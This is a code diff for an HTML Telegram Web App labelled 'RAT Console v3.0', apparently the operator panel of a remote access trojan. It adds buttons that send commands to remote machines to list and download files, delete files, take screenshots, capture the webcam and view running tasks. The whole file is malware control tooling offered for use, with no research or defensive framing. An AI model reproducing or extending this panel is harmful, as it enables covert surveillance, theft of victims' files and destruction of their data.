@@ -5,50 +5,68 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --bg: #0f172a; --card: #1e293b; --accent: #38bdf8; --danger: #ef4444; }
-        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; padding: 20px; }
-        .header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid var(--card); padding-bottom: 10px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        :root { --bg: #0f172a; --card: #1e293b; --accent: #38bdf8; --danger: #ef4444; --success: #22c55e; }
+        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; padding: 15px; }
+        .header { text-align: center; margin-bottom: 15px; border-bottom: 1px solid var(--card); padding-bottom: 5px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        input { 
+            width: 100%; box-sizing: border-box; background: var(--card); border: 1px solid #334155; 
+            color: white; padding: 12px; border-radius: 8px; margin-bottom: 10px; font-size: 14px;
+        }
         button { 
             background: var(--card); color: white; border: 1px solid #334155; 
-            padding: 20px 10px; border-radius: 12px; font-weight: bold; font-size: 14px;
-            transition: transform 0.1s, border-color 0.2s;
+            padding: 15px 5px; border-radius: 10px; font-weight: bold; cursor: pointer;
+            transition: all 0.1s;
         }
-        button:active { transform: scale(0.95); border-color: var(--accent); }
-        .btn-full { grid-column: span 2; }
-        .btn-danger { color: var(--danger); border-color: #7f1d1d; }
-        #status { color: var(--accent); font-size: 12px; margin-top: 10px; }
+        button:active { background: var(--accent); color: black; transform: scale(0.98); }
+        .full { grid-column: span 2; }
+        .danger { color: var(--danger); border-color: #7f1d1d; }
+        .success { color: var(--success); border-color: #14532d; }
+        #status { font-size: 12px; color: var(--accent); margin-bottom: 10px; text-align: center; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h2 id="greet">RAT Console</h2>
-        <div id="status">System: Ready</div>
+        <h3 id="node-name">RAT Console v3.0</h3>
+        <div id="status">Status: Waiting for command...</div>
     </div>
-
+    
+    <input type="text" id="path" placeholder="Enter path (e.g. C:\Users\Desktop)">
+    
     <div class="grid">
-        <button onclick="send('screenshot')">🖥 Screenshot</button>
-        <button onclick="send('taskmgr')">📊 Tasks</button>
-        <button onclick="send('ping')">📡 Ping Node</button>
+        <button class="full" onclick="send('ls|'+val())">📂 List Directory (Explorer)</button>
+        <button onclick="send('dl|'+val())">📥 Download File</button>
+        <button class="danger" onclick="send('del|'+val())">🗑 Delete File</button>
+        
+        <hr class="full" style="border: 0.5px solid #334155; width: 100%;">
+
+        <button onclick="send('ss')">🖥 Screenshot</button>
+        <button onclick="send('cam')">📸 Webcam</button>
+        <button class="full" onclick="send('tm')">📊 Task Manager (Sorted by CPU)</button>
+        
+        <hr class="full" style="border: 0.5px solid #334155; width: 100%;">
+
         <button onclick="send('info')">ℹ️ Sys Info</button>
-        <button class="btn-full btn-danger" onclick="send('shutdown')">🛑 Emergency Shutdown</button>
+        <button class="success" onclick="send('ping')">📡 Ping Node</button>
+        <button class="full danger" onclick="send('shutdown')">🛑 Emergency Shutdown</button>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
         
-        // Security: Show UI only if in TG
-        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-            document.getElementById('greet').innerText = `Node: ${tg.initDataUnsafe.user.first_name}`;
+        function val() { return document.getElementById('path').value; }
+        
+        function send(cmd) { 
+            tg.sendData(cmd); 
+            document.getElementById('status').innerText = `Status: Command [${cmd.split('|')[0]}] sent!`;
+            setTimeout(() => { document.getElementById('status').innerText = "Status: Waiting..."; }, 2000);
         }
 
-        function send(cmd) {
-            tg.sendData(cmd);
-            const status = document.getElementById('status');
-            status.innerText = `Sending: ${cmd}...`;
-            setTimeout(() => { status.innerText = "System: Ready"; }, 1500);
-            // tg.close() is NOT called here so it stays open
+        // Initialize WebApp and update Greeting
+        tg.ready();
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            document.getElementById('node-name').innerText = `Welcome, ${tg.initDataUnsafe.user.first_name}`;
         }
     </script>
 </body>
